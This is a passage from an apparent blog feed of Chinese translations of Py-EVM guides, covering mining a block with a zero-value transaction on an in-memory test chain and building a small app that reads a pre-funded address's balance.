constants.BLANK_ROOT_HASH,</span><br><span class="line">      <span class="string">'receipt_root'</span>: constants.BLANK_ROOT_HASH,</span><br><span class="line">      <span class="string">'difficulty'</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="string">'block_number'</span>: constants.GENESIS_BLOCK_NUMBER,</span><br><span class="line">      <span class="string">'gas_limit'</span>: <span class="number">3141592</span>,</span><br><span class="line">      <span class="string">'timestamp'</span>: <span class="number">1514764800</span>,</span><br><span class="line">      <span class="string">'extra_data'</span>: constants.GENESIS_EXTRA_DATA,</span><br><span class="line">      <span class="string">'nonce'</span>: constants.GENESIS_NONCE</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>接下来，我们将使用已定义的<code>GENESIS_PARAMS</code>和最新的 <code>ByzantiumVM</code> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth <span class="keyword">import</span> MiningChain</span><br><span class="line"><span class="keyword">from</span> eth.vm.forks.byzantium <span class="keyword">import</span> ByzantiumVM</span><br><span class="line"><span class="keyword">from</span> eth.db.backends.memory <span class="keyword">import</span> AtomicDB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">klass = MiningChain.configure(</span><br><span class="line">    __name__=<span class="string">'TestChain'</span>,</span><br><span class="line">    vm_configuration=(</span><br><span class="line">        (constants.GENESIS_BLOCK_NUMBER, ByzantiumVM),</span><br><span class="line">    ))</span><br><span class="line">chain = klass.from_genesis(AtomicDB(), GENESIS_PARAMS)</span><br></pre></td></tr></table></figure><p>现在我们已经有了可用的构建块，让我们把它们放在一起并挖掘一个合适的块！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth.consensus.pow <span class="keyword">import</span> mine_pow_nonce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们必须首先完成（finalize）区块以便可以阅读</span></span><br><span class="line"><span class="comment"># 对PoW算法来说重要的一些属性</span></span><br><span class="line">block = chain.get_vm().finalize_block(chain.get_block())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基于mining_hash, 区块号 以及难度值 我们可以完成</span></span><br><span class="line"><span class="comment"># 实际的工作量证明(PoW) 机制来挖取正确的</span></span><br><span class="line"><span class="comment"># 区块的nonce和mix_hash</span></span><br><span class="line">nonce, mix_hash = mine_pow_nonce(</span><br><span class="line">    block.number,</span><br><span class="line">    block.header.mining_hash,</span><br><span class="line">    block.header.difficulty)</span><br><span class="line"></span><br><span class="line">block = chain.mine_block(mix_hash=mix_hash, nonce=nonce)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(block)</span><br><span class="line">Block <span class="comment">#1</span></span><br></pre></td></tr></table></figure><p>我们花一点时间来完全理解这段代码的作用。</p><p>1.我们调用<a href="https://py-evm.readthedocs.io/en/latest/api/vm/api.vm.vm.html#eth.vm.base.VM.finalize_block" target="_blank" rel="noopener"><code>finalize_block()</code></a>底层VM以检索我们计算<code>nonce</code>和<code>mix_hash</code>所需要的信息。</p><p>2.我们然后调用<code>mine_pow_nonce()</code>来检索我们需要挖掘块的正确的<code>nonce</code>和 <code>mix_hash</code>，满足了验证。</p><p>3.最后我们调用<code>mine_block()</code>并传递<code>nonce</code>和<code>mix_hash</code></p><blockquote><p>！注意</p><p>上面的代码基本上会执行<code>finalize_block</code>两次。请记住，此代码仅用于演示目的，并且Py-EVM将在未来提供可插拔系统以允许PoW挖掘等。</p></blockquote><h2 id="挖掘包含事务的块"><a href="#挖掘包含事务的块" class="headerlink" title="挖掘包含事务的块"></a>挖掘包含事务的块</h2><p>现在我们已经了解了挖掘过程的基本知识，让我们重新审视我们的示例，并在挖掘另一个块之前添加一个事务。为了实现这一目标，我们需要深入了解一些概念。</p><p>每笔交易都是从发件人<code>Address</code>到收件人 <code>Address</code>。每个事务都需要一些计算能力才能得以执行，该能力由单位<code>gas</code>测量。</p><p>在实践中，我们必须支付矿工将我们的交易放在一个区块中。然而， 没有任何技术原因表明我们需要为计算能力付费，而仅仅是经济原因，即实际上我们通常很难找到一个愿意包含不支付其计算成本的交易的矿工。</p><p>然而，在这个例子中，<strong>我们是矿工</strong>，这意味着我们可以自由地包括我们喜欢的任何交易。根据本指南的精神，让我们从简单开始，创建一个将以太网从一个地址发送到另一个地址的事务。请记住，即使传输的值为零，处理的成本仍然是计算成本，但由于我们是矿工，即使没有人愿意为此付费，我们也会挖掘它！</p><p>我们首先设置发送方和接收方。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_keys <span class="keyword">import</span> keys</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> decode_hex</span><br><span class="line"><span class="keyword">from</span> eth_typing <span class="keyword">import</span> Address</span><br><span class="line"></span><br><span class="line">SENDER_PRIVATE_KEY = keys.PrivateKey(</span><br><span class="line">  decode_hex(<span class="string">'0x45a915e4d060149eb4365960e6a7a45f334393093061116b197e3240065ff2d8'</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">SENDER = Address(SENDER_PRIVATE_KEY.public_key.to_canonical_address())</span><br><span class="line"></span><br><span class="line">RECEIVER = Address(<span class="string">b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x02'</span>)</span><br></pre></td></tr></table></figure><p>在这里发现的一件事是我们只需要接收人的普通地址，而对于发送者我们正在获得从该地址派生的地址<code>SENDER_PRIVATE_KEY</code>。那是因为我们显然无法从我们没有私钥的地址用私钥签名交易并发送。</p><p>准备好发送方和接收方后，让我们创建实际的交易。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vm = chain.get_vm()</span><br><span class="line">nonce = vm.state.get_nonce(SENDER)</span><br><span class="line"></span><br><span class="line">tx = vm.create_unsigned_transaction(</span><br><span class="line">    nonce=nonce,</span><br><span class="line">    gas_price=<span class="number">0</span>,</span><br><span class="line">    gas=<span class="number">100000</span>,</span><br><span class="line">    to=RECEIVER,</span><br><span class="line">    value=<span class="number">0</span>,</span><br><span class="line">    data=<span class="string">b''</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>每个事务都需要<code>nonce</code>，不要与<code>nonce</code>我们之前作为PoW算法的一部分开采的事务相混淆。该<em>交易的随机数</em>（nonce）作为一个计数器，以确保从一个地址发出的所有交易可以按序执行。当前<code>nonce</code> 可以通过调用检索<code>get_nonce(sender)()</code>。</p><p>一旦我们有了<code>nonce</code>我们就可以调用<a href="https://py-evm.readthedocs.io/en/latest/api/vm/api.vm.vm.html#eth.vm.base.VM.create_unsigned_transaction" target="_blank" rel="noopener"><code>create_unsigned_transaction()</code></a>并将<code>nonce</code>以及其余的事务属性作为键值对传递。</p><ul><li><code>nonce</code> - 发件人发送的交易数量</li><li><code>gas_price</code>- <code>Wei</code>作为单位的天然气的支付数量</li><li><code>gas</code>- 在拒绝之前允许消耗的最大交易<code>gas</code></li><li><code>to</code> - 交易收件人的地址</li><li><code>value</code>- 要转移给收件人的<code>Wei</code>值</li></ul><p>在我们将交易加入到区块前，我们需要做的最后一步就是使用私钥参数用<code>SENDER_PRIVATE_KEY</code>调用<a href="https://py-evm.readthedocs.io/en/latest/api/rlp/api.rlp.transactions.html#eth.rlp.transactions.BaseUnsignedTransaction.as_signed_transaction" target="_blank" rel="noopener"><code>as_signed_transaction()</code></a>签名这个交易。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signed_tx = tx.as_signed_transaction(SENDER_PRIVATE_KEY)</span><br></pre></td></tr></table></figure><p>最后，我们可以调用<code>apply_transaction()</code>和传递 <code>signed_tx</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chain.apply_transaction(signed_tx)</span><br></pre></td></tr></table></figure><p>以下是完整的脚本，演示了如何使用挖掘包含一个简单的零值传输事务的单个块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth_keys <span class="keyword">import</span> keys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth_utils <span class="keyword">import</span> decode_hex</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth_typing <span class="keyword">import</span> Address</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth <span class="keyword">import</span> constants</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.chains.base <span class="keyword">import</span> MiningChain</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.consensus.pow <span class="keyword">import</span> mine_pow_nonce</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.vm.forks.byzantium <span class="keyword">import</span> ByzantiumVM</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.db.atomic <span class="keyword">import</span> AtomicDB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>GENESIS_PARAMS = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'parent_hash'</span>: constants.GENESIS_PARENT_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'uncles_hash'</span>: constants.EMPTY_UNCLE_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'coinbase'</span>: constants.ZERO_ADDRESS,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'transaction_root'</span>: constants.BLANK_ROOT_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'receipt_root'</span>: constants.BLANK_ROOT_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'difficulty'</span>: <span class="number">1</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'block_number'</span>: constants.GENESIS_BLOCK_NUMBER,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'gas_limit'</span>: <span class="number">3141592</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'timestamp'</span>: <span class="number">1514764800</span>,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'extra_data'</span>: constants.GENESIS_EXTRA_DATA,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'nonce'</span>: constants.GENESIS_NONCE</span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>SENDER_PRIVATE_KEY = keys.PrivateKey(</span><br><span class="line"><span class="meta">... </span>    decode_hex(<span class="string">'0x45a915e4d060149eb4365960e6a7a45f334393093061116b197e3240065ff2d8'</span>)</span><br><span class="line"><span class="meta">... </span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>SENDER = Address(SENDER_PRIVATE_KEY.public_key.to_canonical_address())</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>RECEIVER = Address(<span class="string">b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x02'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>klass = MiningChain.configure(</span><br><span class="line"><span class="meta">... </span>    __name__=<span class="string">'TestChain'</span>,</span><br><span class="line"><span class="meta">... </span>    vm_configuration=(</span><br><span class="line"><span class="meta">... </span>        (constants.GENESIS_BLOCK_NUMBER, ByzantiumVM),</span><br><span class="line"><span class="meta">... </span>    ))</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chain = klass.from_genesis(AtomicDB(), GENESIS_PARAMS)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>vm = chain.get_vm()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nonce = vm.state.get_nonce(SENDER)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tx = vm.create_unsigned_transaction(</span><br><span class="line"><span class="meta">... </span>    nonce=nonce,</span><br><span class="line"><span class="meta">... </span>    gas_price=<span class="number">0</span>,</span><br><span class="line"><span class="meta">... </span>    gas=<span class="number">100000</span>,</span><br><span class="line"><span class="meta">... </span>    to=RECEIVER,</span><br><span class="line"><span class="meta">... </span>    value=<span class="number">0</span>,</span><br><span class="line"><span class="meta">... </span>    data=<span class="string">b''</span>,</span><br><span class="line"><span class="meta">... </span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>signed_tx = tx.as_signed_transaction(SENDER_PRIVATE_KEY)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chain.apply_transaction(signed_tx)</span><br><span class="line">(&lt;ByzantiumBlock(<span class="comment">#Block #1...)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 我们必须首先完成（finalize）区块以便可以阅读</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 对PoW算法来说重要的一些属性</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>block = chain.get_vm().finalize_block(chain.get_block())</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 基于mining_hash, 区块号 以及难度值 我们可以完成</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 实际的工作量证明(PoW) 机制来挖取正确的</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 区块的nonce和mix_hash</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nonce, mix_hash = mine_pow_nonce(</span><br><span class="line"><span class="meta">... </span>    block.number,</span><br><span class="line"><span class="meta">... </span>    block.header.mining_hash,</span><br><span class="line"><span class="meta">... </span>    block.header.difficulty</span><br><span class="line"><span class="meta">... </span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chain.mine_block(mix_hash=mix_hash, nonce=nonce)</span><br><span class="line">&lt;ByzantiumBlock(<span class="comment">#Block #1)&gt;</span></span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethereum </tag>
            
            <tag> py-evm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py-evm之Guides翻译-构建一个使用Py-EVM的应用程序</title>
      <link href="/2019/06/07/py-evm-guides-1/"/>
      <url>/2019/06/07/py-evm-guides-1/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>py-evm系列译文，有不当之处请联系改正，原文如下：<a href="https://py-evm.readthedocs.io/en/latest/guides/building_an_app_that_uses_pyevm.html" target="_blank" rel="noopener">https://py-evm.readthedocs.io/en/latest/guides/building_an_app_that_uses_pyevm.html</a></p><p>py-evm系列译文之2-Guides翻译1：构建一个使用Py-EVM的应用程序</p><a id="more"></a><h1 id="构建一个使用Py-EVM的应用程序"><a href="#构建一个使用Py-EVM的应用程序" class="headerlink" title="构建一个使用Py-EVM的应用程序"></a>构建一个使用Py-EVM的应用程序</h1><p>该<code>Py-EVM</code>库的主要用例之一是使开发人员能够构建想要与以太坊生态系统交互的应用程序。</p><p>在本指南中，我们要构建一个非常简单的脚本，该脚本使用<code>Py-EVM</code>库创建一个带有预先资助地址的新区块链，以便通过常规<code>Py-EVM</code>API 简单地读取该地址的余额。坦率地说，这不是世界上最激动人心的应用程序，但对于更激动人心的用例，如何使用<code>Py-EVM</code>库的原则保持不变。</p><h2 id="设置应用程序"><a href="#设置应用程序" class="headerlink" title="设置应用程序"></a>设置应用程序</h2><p>让我们开始设置一个新的应用程序。通常，该过程涉及大量重复的样板代码，因此不要手动完成所有操作，只需克隆包含我们想要的所有典型事物的 <a href="https://github.com/carver/ethereum-python-project-template" target="_blank" rel="noopener">以太坊Python项目模板</a>。</p><p>要将其克隆到新目录中，请<code>demo-app</code>运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/carver/ethereum-python-project-template.git demo-app</span><br></pre></td></tr></table></figure><p>然后，切换到目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> demo-app</span><br></pre></td></tr></table></figure><h2 id="添加Py-EVM库作为依赖"><a href="#添加Py-EVM库作为依赖" class="headerlink" title="添加Py-EVM库作为依赖"></a>添加Py-EVM库作为依赖</h2><p>要添加<code>Py-EVM</code>为依赖项，请<code>setup.py</code>在应用程序的根目录中打开该文件，然后<code>install_requires</code>按如下所示更改该部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">install_requires=[</span><br><span class="line">    <span class="string">"eth-utils&gt;=1,&lt;2"</span>,</span><br><span class="line">    <span class="string">"py-evm==0.2.0a40"</span>,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><blockquote><p>！警告</p><p>确保还将文件<code>setup.py</code> 的内部<code>name</code>更改为有效项目名（例如<code>demo-app</code>）或其他内容，否则获取依赖项将失败。</p></blockquote><p>接下来，我们需要使用<code>pip</code>包管理器来获取和安装我们的应用程序的依赖项。</p><blockquote><p>！注意</p><p><strong>可选：</strong>通常，保证干净的Python 3环境的最佳方法是使用 <a href="https://virtualenv.pypa.io/en/stable/" target="_blank" rel="noopener">virtualenv</a>。如果我们还没有<code>virtualenv</code>安装，我们首先需要通过pip安装它。</p><p><code>pip install virtualenv</code></p><p>然后，我们可以初始化一个新的虚拟环境<code>venv</code>，例如：</p><p><code>virtualenv -p python3 venv</code></p><p>这将创建一个新目录<code>venv</code>，其中安装包与任何其他全局包隔离。</p><p>要激活虚拟目录，我们必须source它</p><p><code>. venv/bin/activate</code></p><p>要安装依赖项，请运行：</p><p><code>pip install -e .[dev]</code></p></blockquote><p>恭喜！我们现在准备构建我们的应用程序了！</p><h2 id="编写应用程序代码"><a href="#编写应用程序代码" class="headerlink" title="编写应用程序代码"></a>编写应用程序代码</h2><p>接下来，我们将创建一个新目录<code>app</code>并在其中创建一个文件<code>main.py</code>。粘贴以下内容。</p><blockquote><p>！注意</p><p>代码示例通常以交互式会话语法编写，该语法由以<code>&gt;&gt;&gt;</code>或开头的行指示<code>...</code>。这使我们能够针对示例运行自动测试，以确保它们在库不断发展时继续工作。当我们想要复制并粘贴示例代码以使用它时，我们需要删除这些额外的字符以获得可运行的有效Python代码。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth <span class="keyword">import</span> constants</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.chains.mainnet <span class="keyword">import</span> MainnetChain</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth.db.atomic <span class="keyword">import</span> AtomicDB</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> eth_utils <span class="keyword">import</span> to_wei, encode_hex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>MOCK_ADDRESS = constants.ZERO_ADDRESS</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>DEFAULT_INITIAL_BALANCE = to_wei(<span class="number">10000</span>, <span class="string">'ether'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>GENESIS_PARAMS = &#123;</span><br><span class="line"><span class="meta">... </span>    <span class="string">'parent_hash'</span>: constants.GENESIS_PARENT_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'uncles_hash'</span>: constants.EMPTY_UNCLE_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'coinbase'</span>: constants.ZERO_ADDRESS,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'transaction_root'</span>: constants.BLANK_ROOT_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'receipt_root'</span>: constants.BLANK_ROOT_HASH,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'difficulty'</span>: constants.GENESIS_DIFFICULTY,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'block_number'</span>: constants.GENESIS_BLOCK_NUMBER,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'gas_limit'</span>: constants.GENESIS_GAS_LIMIT,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'extra_data'</span>: constants.GENESIS_EXTRA_DATA,</span><br><span class="line"><span class="meta">... </span>    <span class="string">'nonce'</span>: constants.GENESIS_NONCE</span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>GENESIS_STATE = &#123;</span><br><span class="line"><span class="meta">... </span>    MOCK_ADDRESS: &#123;</span><br><span class="line"><span class="meta">... </span>        <span class="string">"balance"</span>: DEFAULT_INITIAL_BALANCE,</span><br><span class="line"><span class="meta">... </span>        <span class="string">"nonce"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="meta">... </span>        <span class="string">"code"</span>: <span class="string">b''</span>,</span><br><span class="line"><span class="meta">... </span>        <span class="string">"storage"</span>: &#123;&#125;</span><br><span class="line"><span class="meta">... </span>    &#125;</span><br><span class="line"><span class="meta">... </span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chain = MainnetChain.from_genesis(AtomicDB(), GENESIS_PARAMS, GENESIS_STATE)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mock_address_balance = chain.get_vm().state.get_balance(MOCK_ADDRESS)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">"The balance of address &#123;&#125; is &#123;&#125; wei"</span>.format(</span><br><span class="line"><span class="meta">... </span>    encode_hex(MOCK_ADDRESS),</span><br><span class="line"><span class="meta">... </span>    mock_address_balance)</span><br><span class="line"><span class="meta">... </span>)</span><br><span class="line">The balance of address <span class="number">0x0000000000000000000000000000000000000000</span> <span class="keyword">is</span> <span class="number">10000000000000000000000</span> wei</span><br></pre></td></tr></table></figure><h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><p>让我们通过调用以下命令来运行脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python app/main.py</span><br></pre></td></tr></table></figure><p>我们应该看到以下输出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The balance of address <span class="number">0x0000000000000000000000000000000000000000</span> <span class="keyword">is</span> <span class="number">10000000000000000000000</span> wei</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethereum </tag>
            
            <tag> py-evm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py-evm之Guides目录翻译</title>
      <link href="/2019/06/07/py-evm-guides/"/>
      <url>/2019/06/07/py-evm-guides/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>py-evm系列译文，有不当之处请联系改正，原文如下：<a href="https://py-evm.readthedocs.io/en/latest/guides/index.html" target="_blank" rel="noopener">https://py-evm.readthedocs.io/en/latest/guides/index.html</a></p><p>py-evm系列译文之2-guides目录翻译</p><a id="more"></a><h1 id="指南"><a href="#指南" class="headerlink" title="指南"></a>指南</h1><p>本节旨在提供实践指南，演示如何使用Py-EVM。如果您正在寻找详细的API描述，请查看<a href="https://py-evm.readthedocs.io/en/latest/api/index.html" target="_blank" rel="noopener">API部分</a>。</p><ul><li><a href="https://py-evm.readthedocs.io/en/latest/guides/quickstart.html" target="_blank" rel="noopener">快速开始</a><ul><li><a href="https://py-evm.readthedocs.io/en/latest/guides/quickstart.html#installation" target="_blank" rel="noopener">安装</a></li></ul></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/building_an_app_that_uses_pyevm.html" target="_blank" rel="noopener">构建一个使用Py-EVM的应用程序</a><ul><li><a href="https://py-evm.readthedocs.io/en/latest/guides/building_an_app_that_uses_pyevm.html#setting-up-the-application" target="_blank" rel="noopener">设置应用程序</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/building_an_app_that_uses_pyevm.html#add-the-py-evm-library-as-a-dependency" target="_blank" rel="noopener">添加Py-EVM库作为依赖项</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/building_an_app_that_uses_pyevm.html#writing-the-application-code" target="_blank" rel="noopener">编写应用程序代码</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/building_an_app_that_uses_pyevm.html#runing-the-script" target="_blank" rel="noopener">运行脚本</a></li></ul></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/architecture.html" target="_blank" rel="noopener">结构</a><ul><li><a href="https://py-evm.readthedocs.io/en/latest/guides/architecture.html#the-chain" target="_blank" rel="noopener">连锁，链条</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/architecture.html#the-vm" target="_blank" rel="noopener">VM</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/architecture.html#the-vmstate" target="_blank" rel="noopener">VMState</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/architecture.html#the-message" target="_blank" rel="noopener">消息</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/architecture.html#the-computation" target="_blank" rel="noopener">计算</a></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/architecture.html#the-opcode" target="_blank" rel="noopener">操作码</a></li></ul></li><li><a href="https://py-evm.readthedocs.io/en/latest/guides/understanding_the_mining_process.html" 